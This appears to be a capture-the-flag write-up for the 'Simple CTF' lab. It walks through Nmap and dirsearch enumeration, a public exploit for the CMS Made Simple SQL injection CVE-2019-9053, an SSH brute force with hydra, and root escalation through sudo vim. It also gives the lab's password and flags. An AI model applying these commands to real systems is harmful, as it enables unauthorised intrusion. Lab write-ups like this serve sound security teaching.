# Simple CTF

**Room:** Simple CTF  
**Author:** Luis (Anub1t)  
**Date:** 2025-09-12

---

## Question 1

**Question:** How many services are running under port 1000?

We can solve this using an Nmap scan:

```bash
nmap -p1-1000 [target_IP]
```

**Result / Answer:** There are **2 services** running below TCP port 1000.

---

## Question 2

**Question:** What is running on the higher port?

We can solve this by running a full port scan:

```bash
nmap -T4 -p- [target_IP]
```

This lets us see which service runs on the highest port on the vulnerable machine.

**Result / Answer:** The service running on the highest port is **SSH**.

---

## Question 3

**Question:** What's the CVE you're using against the application?

To answer this we need to identify the web application and its version. First, searching the target IP on a search engine returned no useful information. Instead, we used a directory discovery tool such as `dirsearch` to find potential directories:

```bash
dirsearch -u [target_IP]
```

We found a directory called `/simple`. Visiting `http://[target_IP]/simple/` we discovered, in the page footer, the web application and its version: **CMS Made Simple version 2.2.8**.

Searching for vulnerabilities for that application and version (for example on the NIST database) revealed the CVE: **CVE-2019-9053**.

---

## Question 4

**Question:** To what kind of vulnerability is the application vulnerable?

On the same page where the CVE was found, the vulnerability type is listed: **SQL Injection**.

**Answer / Flag:** `sqli`

---

## Question 5

**Question:** What's the password?

We must exploit the vulnerability first. I used a public exploit from GitHub:

```
https://github.com/BjarneVerschorre/CVE-2019-9053
```

Before running the exploit, install the dependencies as indicated by the author:

```bash
pip3 install httpx
```

Then run the exploit:

```bash
python3 exploit.py -u "http://[target_IP]/simple/"
```

The exploit returns a username `mitch` and a password in hash form (not directly readable). Using the discovered username, we performed a controlled password attack against SSH with `hydra`:

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 -f -V ssh://[target_IP]
```

**Result / Answer:** The password found was **`secret`**.

---

## Question 6

**Question:** Where can you login with the details obtained?

**Answer:** You can log in to the **SSH** service using the obtained credentials.

---

## Question 7

**Question:** What's the user flag?

Login to SSH with the obtained credentials:

```bash
ssh -p 2222 mitch@[target_IP]
# password: secret
```

After a successful login, list files with `ls`. There is a `user.txt` file. Viewing it:

```bash
cat user.txt
```

**Result / User flag:** `G00d j0b, keep up!`

---

## Question 8

**Question:** Is there any other user in the home directory? What's its name?

From the SSH session:

```bash
cd /home
ls
```

**Result / Answer:** Besides the known user, there is another user named **`sunbath`**.

---

## Question 9

**Question:** What can you leverage to spawn a privileged shell?

Check for elevated permissions with:

```bash
sudo -l -l
```

The output shows that the user `mitch` can run `/usr/bin/vim` as `root` without a password. This is the vector we can leverage to spawn a privileged shell.

**Answer:** The allowed `sudo` command `/usr/bin/vim` (NOPASSWD) can be leveraged to obtain a root shell.

---

## Question 10

**Question:** What's the root flag?

From the SSH session, obtain a root shell using `vim`:

```bash
sudo /usr/bin/vim -c ':!bash' -c ':q'
```

This launches a root shell. Navigate to the root directory (if you start in `/home`, go up one level and then into `/root`):

```bash
cd ..
cd root
ls
cat root.txt
```

**Result / Root flag:** `W3ll d0n3. You made it!`

---

## Notes

This writeup follows the classic CTF flow: enumerate services, find web application version, locate a public CVE and exploit it to obtain credentials, access SSH on a non-standard port (2222), and perform post-exploitation checks (`sudo -l`) to find a privilege escalation vector (vim as NOPASSWD), which was used to obtain the root flag.

---

## Disclaimer
> ⚠️ This writeup is for educational purposes only and must be used in authorized environments (labs / CTFs). Do not apply these techniques against systems without explicit permission.
## Disclaimer
> ⚠️ This writeup is for **educational purposes only** and for use in authorized environments (labs / CTFs). Do not apply these techniques against systems without explicit permission from the owner.

---
